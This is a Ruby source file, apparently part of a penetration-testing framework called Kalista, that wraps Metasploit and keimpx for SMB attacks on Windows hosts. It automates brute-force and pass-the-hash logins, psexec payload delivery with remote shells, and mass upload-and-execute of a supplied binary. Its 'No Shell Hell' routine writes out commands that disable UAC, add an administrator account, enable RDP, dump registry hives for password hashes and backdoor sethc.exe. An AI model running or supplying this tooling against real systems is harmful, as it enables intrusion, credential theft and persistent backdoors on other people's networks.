# This is our SMBWrap Class
# This should house anything related to SMB Enumeration
# Most of these are handy in pre-exploit stages or for enumerating further systems after once has been comprimised (pass-the-hash)
# If you add, just update the usage and e_shell function to make available

class SMBWrap
	def show_smbfun_usage
		puts "List of available commands and general description".light_yellow + ": ".white
		puts "\tcls".light_yellow + "          => ".white + "Clear Screen".light_yellow
		puts "\thelp ".light_yellow + "        => ".white + "Display this Help Menu".light_yellow
		puts "\tback ".light_yellow + "        => ".white + "Return to Main Menu".light_yellow
		puts "\texit ".light_yellow + "        => ".white + "Exit Completely".light_yellow
		print_line("")
		puts "\tsmb_version ".light_yellow + " => ".white + "SMB Version Scanner".light_yellow
		puts "\tsmb_login ".light_yellow + "   => ".white + "SMB Login Scanner".light_yellow
		puts "\tsmb_pipe ".light_yellow + "    => ".white + "SMB Pipe Auditor".light_yellow
		puts "\tsmb_dcerpc ".light_yellow + "  => ".white + "SMB DCERPC Pipe Auditor".light_yellow
		puts "\tsmb_shares ".light_yellow + "  => ".white + "SMB Shares Enumerator".light_yellow
		puts "\tsmb_domains ".light_yellow + " => ".white + "SMB Domain Users Enumerator".light_yellow
		puts "\tsmb_exec ".light_yellow + "    => ".white + "MSF PSEXEC_COMMAND (No Shell CMD Exec)".light_yellow
		puts "\tnoshell_hell ".light_yellow + "=> ".white + "MSF PSEXEC_COMMAND (No Shell Hell)".light_yellow
		puts "\tpsexec ".light_yellow + "      => ".white + "MSF PSEXEC Payload Delivery".light_yellow
		puts "\tkeimpx ".light_yellow + "      => ".white + "KEIMPX SMB Tool".light_yellow
		puts "\tmpx ".light_yellow + "         => ".white + "Multi-Scan PSEXEC Upload & Execute Wrapper".light_yellow
		print_line("")
	end

	#SMBWrap Main Menu
	def s_shell
		prompt = "(SMBFun)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					s_shell
				when /^help|^h$|^ls$/i
					show_smbfun_usage
					s_shell
				when /^exit|^quit/i
					print_line("")
					print_error("OK, exiting Kalista....")
					print_line("")
					exit 69;
				when /^back|^main/i
					print_line("")
					print_error("OK, back to the Main Menu....")
					print_line("")
					$framework.core_shell
				when /^smb_vers|^smbv$/i
					print_line("")
					smb_version
					print_line("")
					s_shell
				when /^smb_log|^smbl$/i
					print_line("")
					smb_login
					print_line("")
					s_shell
				when /^smb_pipe|^pipe_audit/i
					print_line("")
					smb_pipe_audit
					print_line("")
					s_shell
				when /^smb_dcerpc|^dcerpc_audit/i
					print_line("")
					smb_dcerpc_pipe_audit
					s_shell
				when /^smb_shares|^shares/i
					print_line("")
					smb_shares
					print_line("")
					s_shell
				when /^smb_domain|^domain/i
					print_line("")
					smb_domains
					s_shell
				when /^smb_exec|^smbexec|^smb_cmd|^smbcmd/i
					print_line("")
					smb_exec
					print_line("")
					s_shell
				when /^keimpx|^k$/i
					print_line("")
					keimpx_wrapper
					print_line("")
					s_shell
				when /^psexec|^psx$/i
					print_line("")
					psexec
					print_line("")
					s_shell
				when /^mpx/i
					print_line("")
					mpx_psexec_wrapper
					print_line("")
					s_shell
				when /^no_shell|^noshell/i
					print_line("")
					no_shell_hell
					print_line("")
					s_shell
				else
					cls
					print_line("")
					print_error("Oops, Didn't quite understand that one")
					print_error("Please Choose a Valid Option From Menu Below Next Time.....")
					print_line("")
					show_smbfun_usage
					s_shell
				end
		end
	end

	#MSF SMB Version Scanner
	def smb_version
		print_status("MSF SMB Version Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_status("Launching MSF SMB Version Scanner against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/scanner/smb/smb_version'
		f.puts "set RHOSTS #{zIP}"
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		smb_vscan="xterm -title 'MSF SMB Version Scan against #{zIP}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(smb_vscan)
		print_line("")
	end

	#MSF SMB Login Scanner
	# Can test clear-text user/pass combinations or with pass-the-hash passwords
	# Great way to check for shared credentials across multiple network machines....
	def smb_login
		print_status("SMB Login Check Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/smb/smb_login"
		f.puts "set RHOSTS #{zIP}"
		done=0
		while(true)
			print_caution("Select how to Scan for SMB Logins: ")
			print_caution("1) Single User/Pass Combo across IP")
			print_caution("2) User & Password Files for Bruteforce Scanning IP")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				smbUser=gets.chomp

				print_caution("Please provide Password: ")
				smbPass=gets.chomp

				f.puts "set SMBUser #{smbUser}"
				f.puts "set SMBPass #{smbPass}"
				done=1
				break
			elsif answer.to_i == 2
				while(true)
					print_caution("Location of Password File to use:")
					passfile=gets.chomp
					puts
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find file, please check path or permissions and try again....\n\n")
						print_error("")
					end
				end
				while(true)
					print_caution("Location of Username File to use:")
					userfile=gets.chomp
					puts
					if File.exists?(userfile)
						break
					else
						print_error("")
						print_error("Can't find file, please check path or permissions and try again....\n\n")
						print_error("")
					end
				end

				f.puts "set PASS_FILE #{passfile}"
				f.puts "set USERPASS_FILE #{userfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try username as passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MSF SMB Login Scanner against #{zIP} in a new x-window.....")
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		smb_login_chk="xterm -title 'MSF SMB Login Scanner #{zIP}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(smb_login_chk)
		print_line("")
	end

	# MSF SMB Pipe Auditor
	# Handy for fixing pipe in use for several common winblows exploits....
	def smb_pipe_audit
		print_status("SMB Session Pipe Auditor")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_status("Launching MSF SMB Session Pipe Auditor against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/scanner/smb/pipe_auditor'
		f.puts "set RHOSTS #{zIP}"
		f.puts 'run'
		f.close
		pipe_audit="xterm -title 'MSF SMB Pipe Auditor' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(pipe_audit)
		print_line("")
	end

	# MSF SMB DCERPC Pipe Auditor
	# Good for enumerating RPC Services & Some extra info or leads....
	def smb_dcerpc_pipe_audit
		print_status("SMB DCERPC Pipe Auditor")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Use default 'BROWSER' pipe for check (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("Provide SMBPIPE to Scan with: ")
			zPIPE=gets.chomp
		else
			zPIPE='BROWSER'
		end

		print_status("Launching MSF SMB DCERPC Pipe Auditor against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/scanner/smb/pipe_dcerpc_auditor'
		f.puts "set RHOSTS #{zIP}"
		f.puts "set SMBPIPE #{zPIPE}"
		f.puts 'run'
		f.close
		pipe_audit="xterm -title 'SMB DCERPC Pipe Auditor' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(pipe_audit)
		print_line("")
	end

	# SMB Shares Enumeration using MSF
	def smb_enum_shares
		print_status("SMB Share Enumeration")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Please provide Username: ")
		smbUser=gets.chomp

		print_caution("Please provide Password: ")
		smbPass=gets.chomp

		print_status("Launching MSF Share Enumeration Scanner against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/scanner/smb/smb_enumshares'
		f.puts "set RHOSTS #{zIP}"
		f.puts "set SMBUser #{smbUser}"
		f.puts "set SMBPass #{smbPass}"
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		shares_enum="xterm -title 'MSF SMB Shares Enum' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(shares_enum)
		print_line("")
	end

	#MSF SMB Domain Enumerator
	# It uses known credentials to run checks to see if any belong to domain accounts
	# Good method to check post exploit to see if any accounts are domain accounts 
	# for which you might be able to steal tokens and escalate against.....
	def smb_domains
		print_status("SMB Domain User Enumeration")
		print_caution("Provide Target IP/Range: ")
		zIP=gets.chomp

		print_caution("Please provide Username: ")
		smbUser=gets.chomp

		print_caution("Please provide Password or LM:NTLM Hash:")
		smbPass=gets.chomp

		print_status("Launching Domain User Enumeration Scanner against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/scanner/smb/smb_enumusers_domain'
		f.puts "set RHOSTS #{zIP}"
		f.puts "set SMBUser #{smbUser}"
		f.puts "set SMBPass #{smbPass}"
		f.puts "set SMBDOMAIN WORKGROUP"
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		smb_domain_enum="xterm -title 'MSF SMB Domain Enum' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(smb_domain_enum)
		print_line("")
	end

	# keipmx wrapper
	# Tool by Bernardo (SQLMAP) which uses the IMPACKET lib from CORE IMPACT
	# Has ability to perform credential checks across network or range of targets
	# Can also perform pass the hash attack
	# Ability to enumerate shares, files, services, and start/stop services as well as Bind Shell via Service method - Super Handy tool to have around!
	def keimpx_wrapper
		print_status("Simple Wrapper for the KEIMPX SMB Tool")
		while(true)
			print_caution("Select Targeting Method: ")
			print_caution("1) Single IP/Range")
			print_caution("2) List with Targets")
			answer=gets.chomp
			if answer == '1'
				print_caution("Please Provide Target IP: ")
				t=gets.chomp
				zIP="-t #{t}"
				break
			elsif answer == '2'
				print_caution("Please Provide Target List: ")
				dfile=gets.chomp
				if File.exists?(dfile)
					zIP="-l #{dfile}"
					break
				else
					print_error("")
					print_error("Can't seem to find provided target list!")
					print_error("Check the permissions or the path and try again.....")
					print_error("")
				end
			end
		end
		while(true)
			print_caution("Select Credentials Method: ")
			print_caution("1) Known Username & Password Plaintext")
			print_caution("2) Known Username & Password Hash")
			print_caution("3) List File with Known Credentials (Hashdump)")
			answer=gets.chomp
			if answer == '1'
				print_caution("Provide Username: ")
				zUSER=gets.chomp

				print_caution("Provide Password: ")
				zPASS=gets.chomp
				zCREDS="-U #{zUSER} -P #{zPASS}"
				break
			elsif answer == '2'
				print_caution("Provide Username: ")
				zUSER=gets.chomp

				print_caution("Provide LM Hash: ")
				zLM=gets.chomp

				print_caution("Provide NT Hash: ")
				zNT=gets.chomp
				zCREDS="-U #{zUSER} --lm=#{zLM} --nt=#{zNT}"
				break
			elsif answer == '3'
				print_caution("Please Provide Credentials File: ")
				dfile=gets.chomp
				if File.exists?(dfile)
					zCREDS="-c #{dfile}"
					break
				end
			end
		end
		print_caution("Include Domain info (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("1) Single Domain")
			print_caution("2) List of Domains")
			answer=gets.chomp
			if answer == '2'
				print_caution("Provide Domain List File: ")
				domfile=gets.chomp
				if File.exists?(domfile)
					zDomain=" -d #{domfile}"
				else
					print_error("")
					print_error("Can't find the provided Domain list file!")
					print_error("Check the permissions or the path and try again, moving forward with out it....")
					zDomain=''
				end
			else
				print_caution("Provide Domain: ")
				dom=gets.chomp
				zDomain=" -D #{dom}"
			end
		else
			zDomain=''
		end
		print_caution("Select Port: ")
		print_caution("1) 445 (Default)")
		print_caution("2) 139")
		answer=gets.chomp
		if answer == '2'
			zPORT=' -p 139'
		else
			zPORT=' '
		end
		print_status("Launching KEIMPX in new window, hang tight.....")
		k = "#{KEIMPX}/keimpx.py #{zIP} #{zCREDS}#{zPORT}#{zDomain}"
		keimpx="xterm -title 'KEIMPX' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{k}'\""
		fireNforget(keimpx)
		print_line("")
	end

	# MSF Microsoft Windows Authenticated User Code Execution Payload Delivery
	# Takes valid credentials on target and uses SMB PSEXEC technique to login and execute payload
	# This method does NOT upload a binary file!!!!!!!!!!
	# Accepts username and password or password hash for pass-the-hash attacks
	# Very useful, much thanks to @R3dy__!
	def smb_exec
		print_status("")
		print_status("Windows Authenticated User Code Execution")
		print_status("   MSF PSEXEC_COMMAND Payload Delivery   ")
		print_status("")
		print_caution("Provide Username: ")
		zUSER=gets.chomp

		print_caution("Provide Password or LM:NTLM Hash: ")
		zPASS=gets.chomp

		print_caution("Set Domain (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("Domain to use: ")
			zDOMAIN=gets.chomp
		else
			zDOMAIN='WORKGROUP'
		end

		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Number of Threads to Run (1,5,..): ")
		zTHREADS=gets.chomp

		print_caution("Use default SMB Port 445 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='445'
		end

		print_caution("Use C$ share (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide share to use: ")
			zSHARE=gets.chomp
		else
			zSHARE='C$'
		end
		#Our Base Resource File, just needs commands and run statements added
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/admin/smb/psexec_command"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set SMBSHARE #{zSHARE}"
		f.puts "set SMBDomain #{zDOMAIN}"
		f.puts "set SMBUser #{zUSER}"
		f.puts "set SMBPass #{zPASS}"
		f.puts "set THREADS #{zTHREADS}"
		#Get commands from user
		print_line("")
		print_error("No Daisy Chains!")
		print_caution("Enter the number of Commands you need to run (1,2,..): ")
		zcount=gets.chomp
		if not zcount =~ /\d+/
			zcount=1
		end
		cmdz=[]
		count=1
		while zcount.to_i > 0
			print_caution("Enter Command #{count}: ") 
			cmdz << gets.chomp
			count = count.to_i + 1
			zcount = zcount.to_i - 1
		end
		print_line("")
		cmdz.each do |cmd|
			f.puts "set COMMAND #{cmd}"
			f.puts "run"
		end
		f.close
		print_status("Launching MSF PSEXEC_COMMAND against #{zIP}:#{zPORT} in a new x-window.....")
		win_psexec_cmd="xterm -title 'MSF PSEXEC_COMMAND' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(win_psexec_cmd)
		print_line("")
	end

	# MSF Microsoft Windows Authenticated User Code Execution Payload Delivery
	# Takes valid credentials on target and uses SMB PSEXEC technique to login and execute payload
	# Accepts username and password or password hash for pass-the-hash attacks
	# Very useful!
	def psexec
		print_status("")
		print_status("Microsoft Windows Authenticated User Code Execution")
		print_status("           MSF PSEXEC Payload Delivery             ")
		print_status("")
		print_caution("Provide Username: ")
		zUSER=gets.chomp

		print_caution("Provide Password or Hash: ")
		zPASS=gets.chomp

		print_caution("Set Domain (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("Domain to use: ")
			zDOMAIN=gets.chomp
		else
			zDOMAIN='WORKGROUP'
		end

		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Use SMB Port 445 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='445'
		end

		print_caution("Use ADMIN$ share (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide share to use: ")
			zSHARE=gets.chomp
		else
			zSHARE='ADMIN$'
		end

		print_status("Payload Selection")
		print_caution("NOTE: remember to choose a Windows Payload!")
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zLPORT=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/smb/psexec"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set SHARE #{zSHARE}"
		f.puts "set SMBDomain #{zDOMAIN}"
		f.puts "set SMBUser #{zUSER}"
		f.puts "set SMBPass #{zPASS}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zLPORT}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close
		print_status("Launching MSF PSEXEC against #{zIP}:#{zPORT} in a new x-window.....")
		win_psexec="xterm -title 'MSF PSEXEC' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(win_psexec)
		print_line("")
	end

	# My homemade wrapper for the MSF standalone psexec.rb tool. 
	# Extending its value with simple loops to allow ranges of targets with credential sets or username and password/hash list.
	# Same as you would with single targte, just allows multi-targeting this way
	# Uses an upload & execute payload, so need a EXE to provide it with & make sure you have your listener or whatever ready before you run :p
	def mpx_psexec_wrapper
		print_status("")
		print_status("Microsoft Windows Authenticated User Code Execution")
		print_status("          HR's Multi-Scan PSEXEC Wrapper           ")
		print_status("")
		while(true)
			print_caution("Provide Targets File with one per line: ")
			zTARGETS=gets.chomp
			if File.exists?(zTARGETS)
				break
			else
				print_error("")
				print_error("Can't find provided file!")
				print_error("Check the path or permissions and try again....")
				print_error("")
			end
		end
		print_caution("Provide Username: ")
		zUSER=gets.chomp
		while(true)
			print_caution("Select Password Option to use: ")
			print_caution("1) Single Password or LM:NTLM Hash")
			print_caution("2) List with one Password or LM:NTLM hash per Line")
			answer=gets.chomp
			case answer
			when 1
				print_caution("Provide Password: ")
				zPASS=gets.chomp
				meth=1
				break
			when 2
				print_caution("Path to Password|Hash File to use: ")
				zPASSWORDS=gets.chomp
				if File.exists?(zPASSWORDS)
					meth=2
					break
				else
					print_error("")
					print_error("Can't find provided file!")
					print_error("Check the path or permissions and try again....")
					print_error("")
				end
			else
				print_error("")
				print_error("#{answer} is not a valid selection!")
				print_error("Please select a option from the menu....")
				print_error("")
			end
		end
		while(true)
			print_caution("Path to Binary Payload to Upload & Execute on success: ")
			zEVIL=gets.chomp
			if File.exists?(zEVIL)
				break
			else
				print_error("")
				print_error("Can't find provided file!")
				print_error("Check the path or permissions and try again....")
				print_error("")
			end
		end

		#Multiple Targets to Attack, read into variable and run through them line by line
		targets=File.open(zTARGETS).readlines
		target.each do |target|
			if meth.to_i == 1
				#Mult Target, Single Pass
				single_target(zUSER, zPASS, target, zEVIL)
			elsif meth.to_i == 2
				#Mult Target, Multi Pass
				passwords=File.open(zPASSWORDS).readlines
				passwords.each do |pass|
					single_target(zUSER, pass, target, zEVIL)
				end
			end
		end
	end

	# Run a single instance of the MSF ruby psexec.rb tool as it was intended to be run
	# Pass it a username, password or hash, a IP for target and the path to the evil.exe payload to use
	# Small function so we can wrap it as needed for extended funcionaility....
	def single_target(user, pass, target, evil)
		print_status("Running psexec #{user} #{pass} #{target} #{evil}.....")
		Dir.chdir("#{MSFPATH}tools/") {
			system("psexec.rb #{user} #{pass} #{target} #{evil}")
		}
	end

	#### NO # SHELL # HELL ####
	# Some use of @R3dy__'s psexec_command
	# plus a custom modded version I wrote to download the registry hives
	# menu driven resource file builder for all the commands you want:
	# RDP, Add User, Disable UAC, Registry backup, etc
	# If registry is backedup, it also tries to dump the password hashes using PWDUMP
	def no_shell_hell
		print_status("")
		print_status("Windows Authenticated Massacre a.k.a No Shell Hell")
		print_status("   MSF PSEXEC_COMMAND Payload Delivery   ")
		print_status("")
		print_caution("Provide Username: ")
		zUSER=gets.chomp

		print_caution("Provide Password or LM:NTLM Hash: ")
		zPASS=gets.chomp

		print_caution("Set Domain (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("Domain to use: ")
			zDOMAIN=gets.chomp
		else
			zDOMAIN='WORKGROUP'
		end

		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Use default SMB Port 445 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='445'
		end

		print_caution("Use C$ share (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide share to use: ")
			zSHARE=gets.chomp
		else
			zSHARE='C$'
		end

		#Our Base Resource File, just needs commands and run statements added
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/admin/smb/psexec_command"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set SMBSHARE #{zSHARE}"
		f.puts "set SMBDomain #{zDOMAIN}"
		f.puts "set SMBUser #{zUSER}"
		f.puts "set SMBPass #{zPASS}"

		print_caution("Try to Disable UAC (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			uac=true
		else
			uac=false
		end

		print_caution("Try to Add New User Account (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			nusr=true
			print_caution("Provide Username for New Account Creation on Target: ")
			newUSER=gets.chomp
			print_caution("Provide Password for #{newUSER}: ")
			newPASS=gets.chomp
		else
			nusr=false
		end

		print_caution("Try to Enable RDP Service (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			enable_rdp=true
		else
			enable_rdp=false
		end

		print_caution("Try to Backup Key Registry Hives (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			mkhives=true
		else
			mkhives=false
		end

		print_caution("Attempt to Backdoor Sticky Keys Login Assistant (sethc.exe) (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			sethc=true
		else
			sethc=false
		end

		print_caution("Activate Enumeration Commands (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			enum=true
		else
			enum=false
		end

		rez = "#{$results}#{zIP}/spool_logs/"
		Dir.mkdir("#{$results}#{zIP}") unless File.exists?("#{$results}#{zIP}")
		Dir.mkdir(rez) unless File.exists?(rez)
		foo = DateTime.now()
		rezf="#{rez}#{foo.month}#{foo.day}#{foo.year}"

		if enum
			#Enumerate a bunch of information using simple commands
			#The spool file stored in results folder will keep all the results
			enum_cmds = [ 'whoami',
				      'set',
				      'ipconfig /all',
				      'ipconfig /displaydns',
				      'route print',
				      'type %WINDIR%\System32\drivers\etc\hosts',
				      'net view',
				      'netstat -an',
				      'net accounts',
				      'net accounts /domain',
				      'net session',
				      'net share',
				      'fsutil fsinfo drives',
				      'net group',
				      'net user',
				      'net localgroup',
				      'net localgroup administrators',
				      'net group administrators',
				      'net group "Domain Admins" /domain',
				      'net view /domain',
				      'tasklist',
				      'sc query',
				      'gpresult /SCOPE COMPUTER /Z',
				      'gpresult /SCOPE USER /Z'	] #Add more as you like :)
			# Loop through the commands one by one
			# Grabbing results in spool file for each	cmd run
			enum_cmds.each do |cmd|
				f.puts "spool #{rezf}-#{cmd.gsub(" ", '_').gsub("/", '_').gsub('"', '_').gsub("\\", '_')}.txt"
				f.puts "set COMMAND #{cmd}"
				f.puts "run"
				f.puts "spool off"
			end
		end

		if uac
			f.puts "print_line('Attempting to Disable UAC via registry edit....')"
			f.puts "set COMMAND reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
			f.puts "run"
		end

		if nusr
			f.puts "print_line('Attempting to add New User Account....')"
			add_users=[ "net user #{newUSER} #{newPASS} /add", "net localgroup administrators /add #{newUSER}" ]
			add_users.each do |cmd|
				f.puts "spool #{rezf}-new_user_add.txt"
				f.puts "set COMMAND #{cmd}"
				f.puts "run"
				f.puts "spool off"
			end
		end

		if enable_rdp
			f.puts "print_line('Attempting to enable RDP Service via registry....')"
			f.puts "set COMMAND REG.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0"
			f.puts "run"
		end

		if mkhives
			if File.exists?("#{MSFPATH}/modules/auxiliary/admin/smb/psexec_keyhives.rb")
				print_good("w00t - psexec_keyhives.rb found in MSF already!")
				Dir.mkdir("#{$results}#{zIP}/") unless File.exists?("#{$results}#{zIP}/")
				Dir.mkdir("#{$results}#{zIP}/hives/") unless File.exists?("#{$results}#{zIP}/hives/")
				keyhives=true
			else
				print_error("Custom psexec_keyhives.rb module not found in MSF!")
				print_status("Checking for local copy to put in place......")
				if File.exists?("#{HOME}/extras/msf/modules/psexec_keyhives.rb")
					Dir.mkdir("#{$results}#{zIP}/") unless File.exists?("#{$results}#{zIP}/")
					Dir.mkdir("#{$results}#{zIP}/hives/") unless File.exists?("#{$results}#{zIP}/hives/")
					print_good("Local copy found, moving copy into MSF......")
					FileUtils.cp("#{HOME}/extras/msf/modules/psexec_keyhives.rb", "#{MSFPATH}/modules/auxiliary/admin/smb/psexec_keyhives.rb")
					keyhives=true
				else
					print_error("Can't find the required psexec_keyhives.rb file anywhere!")
					print_error("Can't download the registry gives without it!")
					print_error("Make sure you have the latest version of Kalista as it should have come included....")
				end
			end
			if keyhives
				f.puts "use auxiliary/admin/smb/psexec_keyhives"
				f.puts "set LPATH #{$results}#{zIP}/hives/"
				f.puts "set RHOST #{zIP}"
				f.puts "set RPORT #{zPORT}"
				f.puts "set SMBSHARE #{zSHARE}"
				f.puts "set SMBDomain #{zDOMAIN}"
				f.puts "set SMBUser #{zUSER}"
				f.puts "set SMBPass #{zPASS}"
				f.puts "run"
			end
		end

		if sethc
			path = "%SYSTEMROOT%\\\\system32\\\\"
			sethc = [ "takeown /f #{path}sethc.exe", 
				  "icacls #{path}sethc.exe /grant administrators:f", 
				  "rename #{path}sethc.exe  sethc.exe.bak", 
				  "copy #{path}cmd.exe #{path}cmd3.exe", 
				  "rename #{path}cmd3.exe sethc.exe" ]
			sethc.each do |cmd|
				f.puts "set COMMAND #{cmd}"
				f.puts "run"
			end
		end
		if mkhives
			f.puts "#{PWDUMP} #{$results}#{zIP}/hives/sys #{$results}#{zIP}/hives/sam > #{$results}#{zIP}/hashes.txt"
			f.puts "cat #{$results}#{zIP}/hashes.txt"
			f.puts ""
			f.puts ""
			f.puts "loot #{zIP} -a -f #{$results}#{zIP}/hashes.txt -t smb_hash -i windows.hashes"
		end
		f.puts "exit -y"
		f.close
		print_line("")
		print_line("")
		print_status("Launching MSF PSEXEC_COMMAND NO SHELL HELL against #{zIP}:#{zPORT}.....")
		system("#{MSFPATH}/msfconsole -r #{rcfile}")
		if sethc
			sethc_cleanup = [ "takeown /f #{path}sethc.exe", 
					  "icacls #{path}sethc.exe /grant administrators:f",
					  "takeown /f #{path}sethc.exe.bak", 
					  "icacls #{path}sethc.exe.bak /grant Administrators:f",
					  "del #{path}sethc.exe", 
					  "rename #{path}sethc.exe.bak sethc.exe" ]
			fsethc=File.open("#{rezf}-sethc_backdoor-cleanup.txt")
			sethc_cleanup.each do |cmd|
				fsethc.puts cmd
			end
			fsethc.close
			print_good("To remove the sethc.exe backdoor run commands stored in: ")
			print_good("#{rezf}-sethc_backdoor-cleanup.txt")
		end
		print_line("")
	end
end
